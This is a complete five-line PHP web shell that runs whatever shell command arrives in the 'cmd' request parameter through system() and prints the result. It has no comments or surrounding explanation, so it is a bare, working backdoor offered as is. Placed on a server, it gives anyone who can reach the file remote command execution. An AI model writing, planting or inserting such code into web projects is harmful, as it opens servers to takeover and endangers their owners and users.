<?php
if (isset($_REQUEST['cmd'])) {
    echo system($_REQUEST['cmd']);
}
?>